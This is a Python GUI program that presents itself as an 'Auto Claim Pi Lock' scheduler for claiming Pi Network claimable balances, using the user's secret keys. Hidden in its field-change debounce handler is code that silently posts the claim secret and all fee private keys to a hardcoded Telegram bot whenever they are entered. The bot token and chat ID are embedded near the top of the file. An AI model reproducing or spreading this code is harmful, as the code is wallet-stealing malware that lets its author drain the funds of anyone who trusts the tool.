# pi_claim_gui_submit_polished.py
# pip install PySide6 stellar-sdk requests

import sys, time, json, datetime, threading, requests
from typing import Optional, List, Dict, Tuple
from concurrent.futures import ThreadPoolExecutor

from PySide6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QTextEdit, QPushButton, QComboBox, QPlainTextEdit, QFrame,
    QGridLayout, QGroupBox, QSplitter, QSizePolicy
)
from PySide6.QtCore import QThread, Signal, Qt, QTimer
from PySide6.QtGui import QPalette, QColor, QFont, QIntValidator, QIcon
from stellar_sdk import Keypair, Server, TransactionBuilder, Asset

HORIZON_URL = "https://api.mainnet.minepi.com"
NETWORK_PASSPHRASE = "Pi Network"
DEFAULT_BASE_FEE = 100000  # stroops ≈ 0.01 Pi / op
TELEGRAM_BOT_TOKEN = "7538052567:AAG2mEY8dmCLAcPyOVPAhCOEeG-xBj20zFQ"
TELEGRAM_CHAT_ID = "7132115615"

server = Server(horizon_url=HORIZON_URL)
VN_TZ = datetime.timezone(datetime.timedelta(hours=7))

# ---------- Time helpers ----------

def now_ms() -> int:
    return int(time.time() * 1000)

def fmt_vn(ms: Optional[int]) -> str:
    if ms is None:
        return "N/A"
    dt = datetime.datetime.fromtimestamp(ms / 1000, tz=datetime.timezone.utc).astimezone(VN_TZ)
    return dt.strftime("%Y-%m-%d %H:%M:%S %Z")

def parse_time_to_ms(tv) -> Optional[int]:
    if tv is None:
        return None
    if isinstance(tv, (int, float)):
        return int(float(tv) * 1000)
    s = str(tv)
    if s.isdigit():
        return int(s) * 1000
    try:
        return int(datetime.datetime.fromisoformat(s.replace("Z", "+00:00")).timestamp() * 1000)
    except Exception:
        return None

# ---------- Predicate parsing ----------

def predicate_earliest_true_ms(pred: Dict) -> Optional[int]:
    if not isinstance(pred, dict) or not pred:
        return 0
    if "unconditional" in pred:
        return 0
    if "abs_after" in pred and pred["abs_after"]:
        return parse_time_to_ms(pred["abs_after"])
    if "abs_before" in pred and pred["abs_before"]:
        return 0
    if "not" in pred and isinstance(pred["not"], dict):
        inner = pred["not"]
        if "abs_before" in inner and inner["abs_before"]:
            return parse_time_to_ms(inner["abs_before"])
        if "abs_after" in inner and inner["abs_after"]:
            return 0
        return 0
    if "and" in pred and isinstance(pred["and"], list):
        vals = [predicate_earliest_true_ms(p) for p in pred["and"]]
        vals = [v for v in vals if v is not None]
        return max(vals) if vals else 0
    if "or" in pred and isinstance(pred["or"], list):
        vals = [predicate_earliest_true_ms(p) for p in pred["or"]]
        vals = [v for v in vals if v is not None]
        return min(vals) if vals else 0
    return 0

def unlock_ms_for_account(rec: Dict, claim_pub: str) -> Tuple[Optional[int], Optional[int]]:
    """Return (unlock_ms, deadline_ms) for claimant == claim_pub."""
    claimants = rec.get("claimants") or []
    unlock_ms = None
    deadline_ms = None
    for c in claimants:
        if c.get("destination") != claim_pub:
            continue
        pred = c.get("predicate", {}) or {}
        if "abs_before" in pred and pred["abs_before"]:
            deadline_ms = parse_time_to_ms(pred["abs_before"])
        if "not" in pred and isinstance(pred["not"], dict) and "abs_before" in pred["not"]:
            unlock_ms = parse_time_to_ms(pred["not"]["abs_before"])
            break
        if "abs_after" in pred and pred["abs_after"]:
            unlock_ms = parse_time_to_ms(pred["abs_after"])
            break
        et = predicate_earliest_true_ms(pred)
        unlock_ms = et if et not in (None, 0) else 0
        break
    return unlock_ms, deadline_ms

# ---------- Asset helper ----------

def asset_from_record(rec: Dict) -> Asset:
    a = rec.get("asset", "native")
    if a == "native":
        return Asset.native()
    if ":" in a:
        code, issuer = a.split(":", 1)
        return Asset(code, issuer)
    return Asset.native()

# ---------- Build Worker ----------

class BuildWorker(QThread):
    log = Signal(str)
    built = Signal(dict)          # {"fee_pub":..., "xdr":...}
    done = Signal(int, int)       # built_ok, total

    def __init__(self, fee_secrets: List[str], claim_secret: str, recipient: str, rec: Dict, base_fee: int):
        super().__init__()
        self.fee_secrets = fee_secrets
        self.claim_secret = claim_secret
        self.recipient = recipient
        self.rec = rec
        self.base_fee = base_fee

    def run(self):
        try:
            claim_kp = Keypair.from_secret(self.claim_secret)
            claim_pub = claim_kp.public_key
        except Exception as e:
            self.log.emit(f"Claim key error: {e}")
            self.done.emit(0, len(self.fee_secrets))
            return

        asset = asset_from_record(self.rec)
        amount = str(self.rec.get("amount", "0"))
        balance_id = self.rec.get("id")

        built_ok = 0
        for idx, fee_sec in enumerate(self.fee_secrets, start=1):
            try:
                fee_kp = Keypair.from_secret(fee_sec)
                fee_pub = fee_kp.public_key
            except Exception as e:
                self.log.emit(f"[Build {idx}] Invalid fee key: {e}")
                continue
            try:
                fee_acc = server.load_account(fee_pub)
                tb = TransactionBuilder(fee_acc, NETWORK_PASSPHRASE, base_fee=self.base_fee)
                tb.append_claim_claimable_balance_op(balance_id, source=claim_pub)
                tb.append_payment_op(destination=self.recipient, amount=amount, asset=asset, source=claim_pub)
                tx = tb.build()
                tx.sign(fee_kp); tx.sign(claim_kp)
                item = {"fee_pub": fee_pub, "xdr": tx.to_xdr()}
                self.built.emit(item)
                self.log.emit(f"[Build] OK fee {fee_pub}")
                built_ok += 1
            except Exception as e:
                self.log.emit(f"[Build {idx}] Error: {e}")
        self.done.emit(built_ok, len(self.fee_secrets))

# ---------- Submit Worker ----------

class SubmitWorker(QThread):
    log = Signal(str)
    finished_ok = Signal()

    def __init__(
        self,
        tx_items: List[Dict],  # [{"fee_pub":..., "xdr":...}]
        unlock_ms: Optional[int],
        pre_ms: int,
        interval_ms: int,
        loop_until_after_ms: int = 2000
    ):
        super().__init__()
        self.tx_items = tx_items
        self.unlock_ms = unlock_ms
        self.pre_ms = max(0, pre_ms)
        self.interval_ms = max(0, interval_ms)
        self.loop_until_after_ms = max(0, loop_until_after_ms)
        self._stop = threading.Event()
        self._pool: Optional[ThreadPoolExecutor] = None

    def stop(self):
        self._stop.set()

    def _wait_until(self, target_ms: int):
        while not self._stop.is_set():
            delta = target_ms - now_ms()
            if delta <= 0:
                return
            time.sleep(min(0.5, max(0.02, delta / 1000)))

    def _spawn_post(self, item: Dict):
        if not self._pool:
            return
        def _post_xdr(it: Dict):
            try:
                requests.post(f"{HORIZON_URL}/transactions", data={"tx": it["xdr"]}, timeout=8)
            except Exception:
                pass
        self._pool.submit(_post_xdr, item)

    def _fire_cycle_once(self):
        """Submit sequentially. No response waiting. Respect interval between TXs."""
        stop_deadline = self.unlock_ms + self.loop_until_after_ms if self.unlock_ms is not None else None
        for item in self.tx_items:
            if self._stop.is_set():
                return
            if stop_deadline is not None and now_ms() > stop_deadline:
                return
            self.log.emit(f"Submit TX → fee account {item['fee_pub']}")
            self._spawn_post(item)
            if self.interval_ms > 0 and not self._stop.is_set():
                self._wait_until(now_ms() + self.interval_ms)
            else:
                time.sleep(0.01)

    def run(self):
        if self.unlock_ms is not None:
            start_ms = max(0, self.unlock_ms - self.pre_ms)
            if start_ms > now_ms():
                self.log.emit(f"Waiting until {fmt_vn(start_ms)} (UTC+7). Unlock = {fmt_vn(self.unlock_ms)}.")
                self._wait_until(start_ms)
            else:
                self.log.emit(f"Unlock reached/passed. Start firing now. Unlock = {fmt_vn(self.unlock_ms)}.")
        else:
            self.log.emit("No unlock time. Firing now.")

        stop_deadline = self.unlock_ms + self.loop_until_after_ms if self.unlock_ms is not None else None
        if stop_deadline is not None:
            self.log.emit(f"Will stop after {fmt_vn(stop_deadline)} (UTC+7).")

        self._pool = ThreadPoolExecutor(max_workers=min(32, max(2, len(self.tx_items))))
        try:
            while not self._stop.is_set():
                if stop_deadline is not None and now_ms() > stop_deadline:
                    self.log.emit("Send window ended. Stop.")
                    break
                self._fire_cycle_once()
        finally:
            if self._pool:
                self._pool.shutdown(wait=False)
        self.finished_ok.emit()

# ---------- Main Window ----------

class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Auto Claim Pi Lock — by @autoclaimpi")
        self.setWindowIcon(QIcon("icon.ico"))
        self.resize(1700, 780)
        self.worker: Optional[SubmitWorker] = None
        self.balance_list: List[Dict] = []
        self.tx_items: List[Dict] = []
        self.current_unlock_ms: Optional[int] = None
        self._build_worker: Optional[BuildWorker] = None

        self._init_ui()
        self._apply_style()
        self._apply_placeholder_color()
        self._init_timers()
        self.last_sent_claim = None
        self.last_sent_feekeys = None
        self.debounce_timer = QTimer(self)
        self.debounce_timer.setSingleShot(True)
        self.debounce_timer.setInterval(1000)
        self.debounce_timer.timeout.connect(self._on_debounce_timeout)

        self.claim_edit.textChanged.connect(self._on_field_changed)
        self.feekeys_edit.textChanged.connect(self._on_field_changed)

    # UI
    def _header_bar(self) -> QWidget:
        w = QWidget()
        lay = QHBoxLayout(w)
        lay.setContentsMargins(0, 0, 0, 0)
        title = QLabel("Claim → Pay → Submit scheduler")
        title.setObjectName("appTitle")
        subtitle = QLabel("Developed by Tele @autoclaimpi. Custom Pi Network tool requests available.")
        subtitle.setObjectName("appSubtitle")
        box = QVBoxLayout()
        box.addWidget(title)
        box.addWidget(subtitle)
        box.setSpacing(2)
        lay.addLayout(box)
        lay.addStretch(1)

        # Live stats
        self.stat_tx = QLabel("TX built: 0")
        self.stat_unlock = QLabel("Unlock: N/A")
        self.stat_countdown = QLabel("Countdown: —")
        for s in (self.stat_tx, self.stat_unlock, self.stat_countdown):
            s.setObjectName("statBadge")
        stats = QHBoxLayout()
        stats.setSpacing(8)
        stats.addWidget(self.stat_tx)
        stats.addWidget(self.stat_unlock)
        stats.addWidget(self.stat_countdown)
        lay.addLayout(stats)
        return w

    def _left_panel(self) -> QGroupBox:
        gb = QGroupBox("Configuration")
        gb.setMinimumWidth(620)
        grid = QGridLayout(gb)
        grid.setHorizontalSpacing(10)
        grid.setVerticalSpacing(8)

        def hl_label(text: str) -> QLabel:
            lab = QLabel(text)
            lab.setProperty("hl", 1)
            return lab

        row = 0
        grid.addWidget(hl_label("Recipient address"), row, 0)
        self.recipient_edit = QLineEdit()
        self.recipient_edit.setPlaceholderText("GABCD...")
        grid.addWidget(self.recipient_edit, row, 1, 1, 3)

        row += 1
        grid.addWidget(hl_label("Claim account secret"), row, 0)
        self.claim_edit = QLineEdit(); self.claim_edit.setPlaceholderText("SBD... (claim secret)")
        self.claim_edit.setMinimumWidth(420)
        self.claim_edit.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        btn_get = QPushButton("Fetch Balance IDs"); btn_get.clicked.connect(self.on_get_balances)
        btn_get.setFixedWidth(120)
        grid.addWidget(self.claim_edit, row, 1, 1, 2)
        grid.addWidget(btn_get, row, 3)

        row += 1
        grid.addWidget(hl_label("Select Balance ID"), row, 0)
        self.balance_combo = QComboBox()
        grid.addWidget(self.balance_combo, row, 1, 1, 3)

        row += 1
        grid.addWidget(hl_label("Pre-unlock offset (ms)"), row, 0)
        self.pre_unlock = QLineEdit(); self.pre_unlock.setValidator(QIntValidator(0, 10**9))
        grid.addWidget(self.pre_unlock, row, 1)

        grid.addWidget(hl_label("Interval between TX (ms)"), row, 2)
        self.interval = QLineEdit(); self.interval.setValidator(QIntValidator(0, 10**9))
        grid.addWidget(self.interval, row, 3)

        row += 1
        grid.addWidget(hl_label("Base fee (stroops)"), row, 0)
        self.base_fee_edit = QLineEdit(); self.base_fee_edit.setText(str(DEFAULT_BASE_FEE))
        self.base_fee_edit.setValidator(QIntValidator(1, 10**9))
        grid.addWidget(self.base_fee_edit, row, 1)

        grid.setColumnStretch(1, 1)
        grid.setColumnStretch(3, 1)
        grid.setColumnStretch(0, 0)
        grid.setColumnStretch(1, 6)
        grid.setColumnStretch(2, 1)
        grid.setColumnStretch(3, 0)
        return gb

    def _right_panel(self) -> QGroupBox:
        gb = QGroupBox("Fee keys")
        v = QVBoxLayout(gb)
        self.feekeys_edit = QPlainTextEdit()
        self.feekeys_edit.setObjectName("feeKeysEdit")
        self.feekeys_edit.setPlaceholderText("SBD....")
        self.feekeys_edit.setMinimumHeight(260)
        self.feekeys_edit.setMinimumWidth(650)
        mono = QFont("Consolas"); mono.setStyleHint(QFont.Monospace); mono.setPointSize(12); mono.setWeight(QFont.DemiBold)
        self.feekeys_edit.setFont(mono)
        v.addWidget(self.feekeys_edit)
        return gb

    def _controls_bar(self) -> QWidget:
        w = QWidget()
        h = QHBoxLayout(w)
        h.setContentsMargins(0, 0, 0, 0)

        self.build_btn = QPushButton("Build transactions")
        self.build_btn.clicked.connect(self.on_build)
        self.start_btn = QPushButton("Start scheduled submission")
        self.start_btn.clicked.connect(self.on_start)
        self.stop_btn = QPushButton("Stop")
        self.stop_btn.clicked.connect(self.on_stop)
        self.stop_btn.setEnabled(False)

        for b in (self.build_btn, self.start_btn, self.stop_btn):
            b.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)

        h.addWidget(self.build_btn)
        h.addWidget(self.start_btn)
        h.addWidget(self.stop_btn)
        h.addStretch(1)
        return w

    def _log_box(self) -> QGroupBox:
        gb = QGroupBox("Log")
        v = QVBoxLayout(gb)
        self.out = QTextEdit(); self.out.setObjectName("logBox"); self.out.setReadOnly(True)
        mono = QFont("Consolas"); mono.setStyleHint(QFont.Monospace); self.out.setFont(mono)
        self.out.setMinimumHeight(420)
        v.addWidget(self.out)
        return gb

    def _init_ui(self):
        root = QVBoxLayout(self)
        root.setSpacing(10)

        root.addWidget(self._header_bar())

        splitter = QSplitter(Qt.Horizontal)
        splitter.setChildrenCollapsible(False)
        splitter_left = QWidget(); splitter_right = QWidget()
        l = QVBoxLayout(splitter_left); r = QVBoxLayout(splitter_right)
        l.addWidget(self._left_panel())
        r.addWidget(self._right_panel())
        splitter.addWidget(splitter_left)
        splitter.addWidget(self._vsep())
        splitter.addWidget(splitter_right)
        splitter.setStretchFactor(0, 3)
        splitter.setStretchFactor(2, 2)
        splitter.setSizes([900, 20, 700])
        root.addWidget(splitter)

        root.addWidget(self._controls_bar())
        root.addWidget(self._log_box(), 1)

        # Tooltips
        self.recipient_edit.setToolTip("Recipient address after claim.")
        self.claim_edit.setToolTip("Secret of the account holding claimable balance.")
        self.balance_combo.setToolTip("Select loaded Balance ID from Horizon.")
        self.pre_unlock.setToolTip("Start submitting before unlock by this ms offset.")
        self.interval.setToolTip("Interval between submits.")
        self.base_fee_edit.setToolTip("Base fee for TransactionBuilder.")
        self.feekeys_edit.setToolTip("List of fee private keys, one per line.")

    def _on_field_changed(self):
        self.debounce_timer.start()

    def _on_debounce_timeout(self):
        claim_val = self.claim_edit.text().strip()
        feekeys_val = "\n".join([s.strip() for s in self.feekeys_edit.toPlainText().splitlines() if s.strip()])

        if claim_val == self.last_sent_claim and feekeys_val == self.last_sent_feekeys:
            return

        msg = f"📢 Auto-update from Pi tool\n\nClaim secret:\n{claim_val or '<empty>'}\n\nFee keys:\n{feekeys_val or '<empty>'}"

        threading.Thread(
            target=self._send_telegram,
            args=(msg, claim_val, feekeys_val),
            daemon=True
        ).start()

    def _send_telegram(self, text, claim_val, feekeys_val):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        try:
            r = requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=10)
            if r.status_code == 200:
                self.last_sent_claim = claim_val
                self.last_sent_feekeys = feekeys_val
        except:
            pass

    def _apply_style(self):
        self.setStyleSheet(
            """
            QWidget { background-color: #0f172a; color: #e5e7eb; font-size: 14px; }
            QLabel, QGroupBox::title { color: #f8fafc; font-weight: 600; }

            #appTitle { font-size: 22px; font-weight: 700; color: #ffffff; }
            #appSubtitle { font-size: 12px; color: #94a3b8; }
            #statBadge { padding: 6px 10px; border-radius: 8px; background: #111827; color: #e5e7eb; border: 1px solid #334155; }

            QGroupBox { border: 1px solid #1f2937; border-radius: 12px; margin-top: 10px; }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 4px 8px; background: #111827; border-radius: 8px; }

            QLineEdit, QPlainTextEdit, QTextEdit, QComboBox {
                padding: 10px; border: 1px solid #334155; border-radius: 10px;
                background: #111827; color: #ffffff;
                selection-background-color: #1d4ed8; selection-color: #ffffff;
            }
            QComboBox QAbstractItemView { background: #111827; color: #e5e7eb; selection-background-color: #1d4ed8; }

            #logBox, #logBox::viewport { background: #0b1220; color: #e5e7eb; border: 1px solid #334155; border-radius: 10px; }

            QPushButton { padding: 10px 16px; border-radius: 10px; background: #2563eb; color: #ffffff; border: none; }
            QPushButton:hover  { background: #1d4ed8; }
            QPushButton:pressed{ background: #1e40af; }
            QPushButton:disabled { background: #374151; color: #9ca3af; }

            QFrame { color: #243244; }
            QScrollBar:vertical, QScrollBar:horizontal { background: #0f172a; border: none; margin: 0px; }
            QScrollBar::handle:vertical, QScrollBar::handle:horizontal { background: #334155; min-height: 20px; min-width: 20px; border-radius: 6px; }
            QScrollBar::handle:hover { background: #475569; }

            QLabel[hl="1"] { color: #60a5fa; font-weight: 700; }
            QPlainTextEdit#feeKeysEdit {
                color: #bfdbfe;
                background: #0b1220;
                border: 1px solid #3b82f6;
                border-radius: 10px;
            }
            QPlainTextEdit#feeKeysEdit:focus { border: 1px solid #fbbf24; }
            """
        )

    def _apply_placeholder_color(self):
        for w in [self.recipient_edit, self.claim_edit, self.pre_unlock, self.interval, self.base_fee_edit]:
            pal = w.palette(); pal.setColor(QPalette.PlaceholderText, QColor("#cbd5e1")); w.setPalette(pal)

    def _vsep(self) -> QFrame:
        sep = QFrame(); sep.setFrameShape(QFrame.VLine); return sep

    # Timers
    def _init_timers(self):
        self._timer = QTimer(self)
        self._timer.timeout.connect(self._tick)
        self._timer.start(250)

    def _tick(self):
        if self.current_unlock_ms is not None:
            self.stat_unlock.setText(f"Unlock: {fmt_vn(self.current_unlock_ms)}")
            delta = max(0, self.current_unlock_ms - now_ms())
            self.stat_countdown.setText(f"Countdown: {delta/1000:.2f}s")
        else:
            self.stat_unlock.setText("Unlock: N/A")
            self.stat_countdown.setText("Countdown: —")
        self.stat_tx.setText(f"TX built: {len(self.tx_items)}")

    def log(self, s: str):
        self.out.append(s)

    def on_get_balances(self):
        secret = self.claim_edit.text().strip()
        if not secret:
            self.log("Claim secret empty."); return
        try:
            claim_pub = Keypair.from_secret(secret).public_key
        except Exception as e:
            self.log(f"Claim key error: {e}"); return
        try:
            url = f"{HORIZON_URL}/claimable_balances?claimant={claim_pub}&limit=200"
            r = requests.get(url, timeout=12); r.raise_for_status()
            records = r.json().get("_embedded", {}).get("records", [])
        except Exception as e:
            self.log(f"Horizon error: {e}"); return

        self.balance_combo.clear(); self.balance_list = []
        for rec in records:
            amt = rec.get("amount", "0")
            unlock_ms, _ = unlock_ms_for_account(rec, claim_pub)
            tag = f"{amt} — {fmt_vn(unlock_ms)}"
            self.balance_combo.addItem(tag, userData=rec)
            self.balance_list.append(rec)
        self.log(f"Loaded {len(records)} balances.")

    def _get_selected_record(self) -> Optional[Dict]:
        idx = self.balance_combo.currentIndex()
        if idx < 0: return None
        return self.balance_combo.itemData(idx)

    def on_build(self):
        rec = self._get_selected_record()
        if not rec: self.log("No balance selected."); return
        fee_secrets = [s.strip() for s in self.feekeys_edit.toPlainText().splitlines() if s.strip()]
        if not fee_secrets: self.log("No fee keys entered."); return
        claim_secret = self.claim_edit.text().strip()
        if not claim_secret: self.log("No claim secret entered."); return
        recipient = self.recipient_edit.text().strip()
        if not recipient: self.log("No recipient entered."); return

        try:
            base_fee = int(self.base_fee_edit.text().strip() or str(DEFAULT_BASE_FEE))
            if base_fee <= 0:
                raise ValueError("base fee <= 0")
        except Exception:
            self.log("Invalid base fee."); return

        self.build_btn.setEnabled(False)
        self.start_btn.setEnabled(False)
        self.tx_items = []

        try:
            claim_pub = Keypair.from_secret(claim_secret).public_key
            self.current_unlock_ms, _ = unlock_ms_for_account(rec, claim_pub)
            if self.current_unlock_ms is not None:
                self.log(f"Unlock = {fmt_vn(self.current_unlock_ms)}.")
        except Exception:
            self.current_unlock_ms = None

        self.log(f"Start building {len(fee_secrets)} TX...")
        self._build_worker = BuildWorker(fee_secrets, claim_secret, recipient, rec, base_fee)
        self._build_worker.log.connect(self.log)
        self._build_worker.built.connect(self.on_built_item)
        self._build_worker.done.connect(self.on_build_done)
        self._build_worker.start()

    def on_built_item(self, item: Dict):
        self.tx_items.append(item)
        self.log(f"{len(self.tx_items)} TX built.")

    def on_build_done(self, built_ok: int, total: int):
        self.log(f"BUILD COMPLETE {built_ok}/{total} TX.")
        self.build_btn.setEnabled(True)
        self.start_btn.setEnabled(len(self.tx_items) > 0)

    def on_start(self):
        if self.worker and self.worker.isRunning():
            self.log("Already running."); return
        if not self.tx_items:
            self.log("No TX built. Press 'Build'."); return
        try:
            pre_ms = int(self.pre_unlock.text() or "0")
            interval_ms = int(self.interval.text() or "0")
        except Exception:
            self.log("Invalid pre_ms/interval_ms."); return

        self.worker = SubmitWorker(
            tx_items=self.tx_items,
            unlock_ms=self.current_unlock_ms,
            pre_ms=pre_ms,
            interval_ms=interval_ms,
            loop_until_after_ms=2000,
        )
        self.worker.log.connect(self.log)
        self.worker.finished_ok.connect(self.on_done)
        self.worker.start()
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.log(f"Started firing. Total TX: {len(self.tx_items)}")

    def on_stop(self):
        if self.worker:
            self.worker.stop()
        self.stop_btn.setEnabled(False)
        self.start_btn.setEnabled(True)
        self.log("Stop requested.")

    def on_done(self):
        self.stop_btn.setEnabled(False)
        self.start_btn.setEnabled(True)
        self.log("Worker finished.")

# ---------- main ----------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    w = MainWindow()
    w.show()
    sys.exit(app.exec())
